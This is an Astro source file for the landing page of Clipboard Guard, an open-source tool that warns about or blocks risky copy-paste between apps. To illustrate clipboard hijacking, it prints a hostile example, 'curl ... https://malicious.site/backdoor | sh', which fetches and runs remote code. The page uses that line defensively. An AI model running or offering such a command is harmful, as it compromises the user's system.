---
import BaseLayout from '../layouts/BaseLayout.astro';
import Header from '../components/Header.astro';
import Footer from '../components/Footer.astro';
import FeatureCard from '../components/FeatureCard.astro';
import Icon from '../components/Icon.astro';
import MockWindow from '../components/MockWindow.astro';
import MockSettings from '../components/MockSettings.astro';
import MockNotification from '../components/MockNotification.astro';
import MockWarnings from '../components/MockWarnings.astro';

const base = import.meta.env.BASE_URL;
---

<BaseLayout title="Clipboard Guard - Your clipboard, protected">
  <Header />

  <main>
    <!-- Hero Section -->
    <section class="section">
      <div class="container text-center">
        <h1 class="hero-title">Your clipboard, protected</h1>
        <p class="hero-subtitle text-secondary">
          Clipboard Guard monitors copy-paste operations across apps and prevents accidental data leaks. Open source, runs locally, no data leaves your machine.
        </p>

        <div class="hero-actions">
          <a href={`${base}download`} class="btn btn-primary hero-btn">Download Free</a>
          <a href="https://github.com/mcpick/clipguard" target="_blank" class="btn btn-secondary hero-btn">View on GitHub</a>
        </div>

        <div class="hero-demo">
          <MockNotification />
        </div>
      </div>
    </section>

    <!-- Problem Section -->
    <section class="section section-surface">
      <div class="container">
        <div class="text-center section-header">
          <h2 class="section-title">Why clipboard security matters</h2>
          <p class="section-desc text-secondary">
            Attackers hide malicious commands in web pages. You copy what looks like a normal command, but the clipboard contains something dangerous. Clipboard Guard catches this.
          </p>
        </div>

        <div class="grid grid-2 problem-grid">
          <div class="card card-info">
            <h3 class="card-info-title">What you see</h3>
            <code class="code-block code-info">
              curl -fsSL https://get.docker.com | sh
            </code>
            <p class="card-note text-secondary">Looks like a normal Docker installation command</p>
          </div>

          <div class="card card-warn">
            <h3 class="card-warn-title">What's actually copied</h3>
            <code class="code-block code-warn">
              curl -fsSL https://malicious.site/backdoor | sh
            </code>
            <p class="card-note text-secondary">Hidden malicious command that compromises your system</p>
          </div>
        </div>
      </div>
    </section>

    <!-- Features Section -->
    <section class="section">
      <div class="container">
        <div class="text-center section-header">
          <h2 class="section-title">Everything you need</h2>
          <p class="section-desc text-secondary">Comprehensive clipboard protection that works across all your apps</p>
        </div>

        <div class="grid grid-3">
          <FeatureCard
            title="Clipboard Monitoring"
            description="Detects which app placed content on clipboard and tracks all copy operations in real-time"
            icon="eye"
          />
          <FeatureCard
            title="Cross-App Warnings"
            description="Alerts when pasting between suspicious app pairs like browser to terminal"
            icon="alert-triangle"
          />
          <FeatureCard
            title="Paste Blocking"
            description="Optionally blocks Cmd+V for configured pairs (requires Accessibility permissions)"
            icon="shield"
          />
          <FeatureCard
            title="Custom Rules"
            description="Configure per-app source/destination with notify or block actions"
            icon="settings"
          />
          <FeatureCard
            title="Menu Bar App"
            description="Runs silently in system tray, always watching without getting in your way"
            icon="monitor"
          />
          <FeatureCard
            title="Launch at Login"
            description="Auto-start support, set and forget protection from boot to shutdown"
            icon="power"
          />
        </div>
      </div>
    </section>

    <!-- Screenshots Section -->
    <section class="section section-surface">
      <div class="container">
        <div class="text-center section-header">
          <h2 class="section-title">See it in action</h2>
          <p class="section-desc text-secondary">Clean, native interface that feels right at home on your desktop</p>
        </div>

        <div class="grid screenshots-grid">
          <div class="text-center">
            <MockWindow title="Clipboard Guard Preferences" width="100%">
              <MockSettings />
            </MockWindow>
            <h3 class="screenshot-label">Settings Panel</h3>
            <p class="text-secondary screenshot-desc">Configure rules and manage protection settings</p>
          </div>

          <div class="text-center">
            <div class="notification-demo-bg">
              <MockNotification />
            </div>
            <h3 class="screenshot-label">Smart Notifications</h3>
            <p class="text-secondary screenshot-desc">Native macOS notifications for paste warnings</p>
          </div>

          <div class="text-center">
            <MockWindow title="Recent Warnings" width="100%">
              <MockWarnings />
            </MockWindow>
            <h3 class="screenshot-label">Activity Log</h3>
            <p class="text-secondary screenshot-desc">Track all clipboard security events</p>
          </div>
        </div>
      </div>
    </section>

    <!-- Platforms Section -->
    <section class="section">
      <div class="container">
        <div class="text-center section-header">
          <h2 class="section-title">Cross-platform protection</h2>
          <p class="section-desc text-secondary">Works everywhere you do</p>
        </div>

        <div class="grid grid-3 platforms-grid">
          <div class="card text-center">
            <div class="platform-icon-large"><Icon name="apple" size={40} /></div>
            <h3 class="platform-name">macOS</h3>
            <p class="text-secondary platform-desc">Full support — monitoring + blocking</p>
          </div>

          <div class="card text-center">
            <div class="platform-icon-large"><Icon name="windows" size={40} /></div>
            <h3 class="platform-name">Windows</h3>
            <p class="text-secondary platform-desc">Monitoring + blocking</p>
          </div>

          <div class="card text-center">
            <div class="platform-icon-large"><Icon name="linux" size={40} /></div>
            <h3 class="platform-name">Linux</h3>
            <p class="text-secondary platform-desc">Monitoring support</p>
          </div>
        </div>
      </div>
    </section>

    <!-- Open Source Section -->
    <section class="section section-surface">
      <div class="container">
        <div class="text-center">
          <h2 class="section-title">Free and open source forever</h2>
          <p class="section-desc text-secondary oss-desc">
            Released under the MIT license. Inspect the code, contribute improvements, or fork it for your own needs.
          </p>

          <div class="oss-badges">
            <div class="oss-badge-item">
              <span class="oss-badge">MIT</span>
              <span class="text-secondary oss-badge-label">License</span>
            </div>

            <div class="oss-badge-item">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="var(--color-text-secondary)">
                <path d="M12 2L3 7L12 12L21 7L12 2Z"/>
                <path d="M3 17L12 22L21 17"/>
                <path d="M3 12L12 17L21 12"/>
              </svg>
              <span class="text-secondary oss-badge-label">GitHub Stars</span>
            </div>
          </div>

          <a href="https://github.com/mcpick/clipguard" target="_blank" class="btn btn-secondary">View Source Code</a>
        </div>
      </div>
    </section>
  </main>

  <Footer />
</BaseLayout>

<style>
  .hero-title {
    font-size: 40px;
    margin-bottom: 24px;
    font-weight: 700;
    max-width: 800px;
    margin-left: auto;
    margin-right: auto;
  }

  .hero-subtitle {
    font-size: 18px;
    margin-bottom: 40px;
    max-width: 600px;
    margin-left: auto;
    margin-right: auto;
    line-height: 1.5;
  }

  .hero-actions {
    display: flex;
    gap: 16px;
    justify-content: center;
    align-items: center;
    margin-bottom: 60px;
    flex-wrap: wrap;
  }

  .hero-btn {
    font-size: 18px;
    padding: 16px 32px;
  }

  .hero-demo {
    max-width: 400px;
    margin: 0 auto;
  }

  .section-surface {
    background: var(--color-surface);
  }

  .section-header {
    margin-bottom: 60px;
  }

  .section-title {
    font-size: 32px;
    margin-bottom: 16px;
  }

  .section-desc {
    font-size: 16px;
    max-width: 700px;
    margin: 0 auto;
  }

  .problem-grid {
    max-width: 900px;
    margin: 0 auto;
  }

  .card-info {
    background: var(--color-info-bg);
    border-left: 4px solid var(--color-info);
  }

  .card-info-title {
    color: var(--color-info);
    margin-bottom: 12px;
  }

  .card-warn {
    background: var(--color-warn-bg);
    border-left: 4px solid var(--color-accent);
  }

  .card-warn-title {
    color: var(--color-accent);
    margin-bottom: 12px;
  }

  .code-block {
    padding: 12px;
    border-radius: 6px;
    display: block;
    font-family: var(--font-mono);
    font-size: 13px;
    overflow-x: auto;
    white-space: nowrap;
  }

  .code-info {
    background: #dbeafe;
  }

  .code-warn {
    background: #fee2e2;
  }

  .card-note {
    margin-top: 12px;
    font-size: 14px;
    margin-bottom: 0;
  }

  .screenshots-grid {
    grid-template-columns: repeat(3, 1fr);
    gap: 40px;
  }

  @media (max-width: 768px) {
    .screenshots-grid {
      grid-template-columns: 1fr;
    }
  }

  .screenshot-label {
    margin-top: 20px;
    margin-bottom: 8px;
  }

  .screenshot-desc {
    margin: 0;
  }

  .notification-demo-bg {
    padding: 40px 20px;
    background: var(--color-surface-alt);
    border-radius: var(--radius-lg);
  }

  .platforms-grid {
    max-width: 800px;
    margin: 0 auto;
  }

  .platform-icon-large {
    margin-bottom: 16px;
    color: var(--color-text);
  }

  .platform-name {
    margin-bottom: 8px;
  }

  .platform-desc {
    margin: 0;
    font-size: 14px;
  }

  .oss-desc {
    margin-bottom: 32px;
    max-width: 600px;
    margin-left: auto;
    margin-right: auto;
  }

  .oss-badges {
    display: flex;
    gap: 24px;
    justify-content: center;
    align-items: center;
    margin-bottom: 32px;
    flex-wrap: wrap;
  }

  .oss-badge-item {
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .oss-badge {
    background: var(--color-primary);
    color: white;
    padding: 4px 8px;
    border-radius: var(--radius-sm);
    font-size: 12px;
    font-weight: 500;
  }

  .oss-badge-label {
    font-size: 14px;
  }
</style>
